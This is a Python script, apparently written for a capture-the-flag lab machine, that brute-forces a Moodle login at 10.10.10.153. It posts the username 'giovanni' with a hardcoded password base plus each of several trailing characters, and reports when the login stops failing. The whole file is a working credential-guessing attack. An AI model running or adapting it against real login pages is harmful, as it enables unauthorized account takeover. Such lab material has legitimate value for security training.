#!/usr/bin/env python 
#coding:utf-8

import requests
import sys
import re

class Teacher:
	def __init__(self, target="http://10.10.10.153/", path="moodle/login/index.php",
									   end_pass=None):
	
		'''
			This function will create
			the variables by defaults and testing.
		'''

		self.target_url   = target
		self.path_url     = path
		self.end_password = end_pass

	def send_req(self):
		'''
			This feature will handle the attack
			and send the passwords and test them in function send_req()
		'''
		self.end_password = ["*", "=", "!", "/", "_", "1", "2", "3", "4", "5", "6", "7", "8", "9", "#", "+"]

		for convert_password in self.end_password:
			plain_password = "Th4C00lTheacha" + convert_password.strip("\n")
			plain_requests = {"anchor":"", "username":"giovanni", "password":plain_password, "rememberusername":"1"}
		
			req_http = requests.post(self.target_url + self.path_url, data=plain_requests).text
			if("Invalid login" in "".join(req_http))     :  print("[-] Password not cracked : %s") %(plain_password)
			if not("Invalid login" in "".join(req_http)) :	print("\n[+] Password cracked with success : %s\n" %(plain_password)), sys.exit(0)

if __name__ == "__main__":
	req = Teacher()
	req.send_req()
